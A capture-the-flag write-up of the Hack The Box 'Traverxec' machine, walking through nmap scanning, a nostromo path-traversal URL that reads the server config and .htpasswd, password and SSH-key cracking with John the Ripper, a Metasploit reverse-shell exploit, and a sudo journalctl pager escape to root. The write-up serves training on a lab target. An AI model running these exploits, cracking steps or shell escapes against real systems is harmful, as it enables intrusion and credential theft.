---
layout: single_c
title:  "Hack The Box - Traverxec Writeup"
date:   2019-12-16 10:43:16 +0530
categories: HTB
tags: OSCP
classes: wide
---
### Hack The Box - Traverxec
![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/traverxec1.png){: .align-center}

## Enumeration
Lets start by enumerating

#### Nmap
```bash
root@kali:~# nmap -sC -sV 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 18:36 IST
Nmap scan report for 10.10.10.165
Host is up (0.24s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.54 seconds
```

There is a `nostromo` server running on port 80

#### Searchsploit
I did a quick search using `searchsploit` and it returned an interesting directory traversal exploit. And it seems to be a recent one.  
[Nostromo Directory Traversal](https://www.exploit-db.com/exploits/47573)
```bash
searchsploit nostromo
-----------------------------------------------------------------------------------------------------------------
Exploit Title                                                                |  Path (usr/share/exploitdb/)
-----------------------------------------------------------------------------------------------------------------
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution         | exploits/linux/remote/35466.sh
-----------------------------------------------------------------------------------------------------------------
Shellcodes: No Result
```


## Exploitation
So the directory traversal attack seems to be working.

I had to browse around a little bit and finally found an interesting `config` file.

```apache
http://10.10.10.165/.%0D./.%0D./nostromo/conf/nhttpd.conf

# MAIN [MANDATORY]
servername  traverxec.htb
serverlisten  *
serveradmin  david@traverxec.htb
serverroot  /var/nostromo
servermimes  conf/mimes
docroot   /var/nostromo/htdocsdoc
index  index.html
# LOGS [OPTIONAL]l
ogpid   logs/nhttpd.pid
# SETUID [RECOMMENDED]
user   www-data
# BASIC AUTHENTICATION [OPTIONAL]
htaccess  .htaccess
htpasswd  /var/nostromo/conf/.htpasswd
# ALIASES [OPTIONAL]
/icons   /var/nostromo/icons
# HOMEDIRS [OPTIONAL]
homedirs  /home
homedirs_public  public_www
```

There are few interesting lines in this config

```apache
htpasswd  /var/nostromo/conf/.htpasswd
```

and

```apache
homedirs  /home
homedirs_public  public_www
```

Lets see the contents of `.htpasswd`
```apache
http://10.10.10.165/.%0D./.%0D./.%0D./var/nostromo/conf/.htpasswd

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Looks like we have some credentials. Lets see if we can crack it.

#### John The Ripper
```bash
root@kali:~/Desktop/traverxec# john --wordlist=/usr/share/wordlists/rockyou.txt .htaccess 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 4.24% (ETA: 15:59:00) 0g/s 86902p/s 86902c/s 86902C/s andre93..anakin3
0g 0:00:00:13 6.90% (ETA: 15:59:00) 0g/s 86429p/s 86429c/s 86429C/s 075582..072609069
0g 0:00:00:15 7.89% (ETA: 15:59:02) 0g/s 84891p/s 84891c/s 84891C/s slash14..sl9024
0g 0:00:00:45 21.29% (ETA: 15:59:23) 0g/s 71746p/s 71746c/s 71746C/s thebled03..thebigwaid
0g 0:00:00:46 21.89% (ETA: 15:59:22) 0g/s 71864p/s 71864c/s 71864C/s tazpam..tazmen1
0g 0:00:01:26 43.04% (ETA: 15:59:11) 0g/s 71815p/s 71815c/s 71815C/s lelfie21..leleis#1
0g 0:00:01:43 54.15% (ETA: 15:59:02) 0g/s 74740p/s 74740c/s 74740C/s gogfuc..goge4l12
Nowonly4me       (david)
1g 0:00:02:34 DONE (2019-12-06 15:58) 0.006490g/s 68658p/s 68658c/s 68658C/s Noyoudo..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we have cracked it, but where can we use it?.

Okay, so at this point I was really struggling to find a way to gain an initial foothold in the server. But then I reread the exploit
and understood that it is in fact an `RCE` vulnerability and now I am feeling stupid for not reading the exploit properly.

## Low Priv Shell
So there is a `metasploit` module for this exploit. Lets try that.

#### Metasploit
```bash
msf5 > use exploit/multi/http/nostromo_code_exec 
msf5 exploit(multi/http/nostromo_code_exec) > set rhosts 10.10.10.165
rhosts => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.165     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > set lhost 10.10.14.22
lhost => 10.10.14.22
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.22:4444 -> 10.10.10.165:57986) at 2019-12-07 13:54:50 +0530

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And we have a shell

## Enumeration 2
Going back to the config file that we found, there was another interesting entry in there

```apache
# HOMEDIRS [OPTIONAL]
homedirs  /home
homedirs_public  public_www
```

From the `nostromo` docs
```
HOMEDIRS
To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the
home directories are stored, normally /home.  
To access a users home directory enter a ~ in the URL followed by the 
home directory name like in this example:

http://www.nazgul.ch/~hacki/
```

So there is a folder named `public_www`, in the folder `/home/david`

Lets see whats in the there

```bash
$ cd /home/david/public_www
$ ls
index.html  protected-file-area
$ cd protected-file-area
$ ls
backup-ssh-identity-files.tgz  home
```

Looks like a backup of ssh files. I copied it to my system and extracted it. The private key is encrypted with a pass phrase.
Lets try to bruteforce the pass phrase using `John`
#### John The Ripper
We have to convert it before cracking, using `ssh2john.py`
```bash
root@kali:~/Desktop/traverxec/home/david/.ssh# python ssh2john.py id_rsa > johncrack
root@kali:~/Desktop/traverxec/home/david/.ssh# ls
authorized_keys  crackjohn  id_rsa  id_rsa.pub  johncrack  ssh2john.py

root@kali:~/Desktop/traverxec/home/david/.ssh# john --wordlist=/usr/share/wordlists/rockyou.txt johncrack 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:03 26.33% (ETA: 19:18:56) 0.3311g/s 1307Kp/s 1307Kc/s 1307KC/s schwedt92..schweaty
1g 0:00:00:11 DONE (2019-12-07 19:18) 0.08726g/s 1251Kp/s 1251Kc/s 1251KC/sa6_123..*7¡Vamos!
Session completed
```
Succesfully cracked. 
## User Shell
Lets try to `ssh` into the box using the private key
```bash
root@kali:~/Desktop/traverxec/home/david/.ssh# ssh david@10.10.10.165 -i /root/Desktop/traverxec/home/david/.ssh/id_rsa
Enter passphrase for key '/root/Desktop/traverxec/home/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sat Dec  7 08:30:27 2019 from 10.10.15.12
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b484***********************
```

And we have a user shell

## Privilege Escalation
There is an interesting file named `server-stats.sh` in `/bin` directory. Lets see what it does.   
Running the `server-stats.sh` just prints out some log using `journalctl` and then exits.
```bash
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```
The last line looks suspicious and its being run as `root`. So we gain root access if we can somehow exploit it.
After bit of searching around, I found this `journalctl` [vulnerability.](https://gtfobins.github.io/gtfobins/journalctl/)

## Root Shell

So the command `usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` prints out the log and exits. But we can't exploit it because `journalctl` exits right after printing.
Our aim is to launch a shell from within the `journalctl` command. Journalctl uses `less` command by default to view the log. So we have to find a way to prevent the command from exiting. The trick can be found in the `journalctl` man page. 
```bash
man journalctl | grep width -B 1 -A 2

        The output is paged through less by default, and long lines are "truncated" to screen width. 
        The hidden part can be viewed by using the left-arrow and right-arrow
        keys. Paging can be disabled; see the --no-pager option and the "Environment" section below.
```
So if we run this command in a small resized window, it won't exit after printing the log and then we can spawn a shell as `root` user.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/traverxec_root.png){: .align-center}

(In a small window)
```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

!done  (press RETURN)
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
And we are root!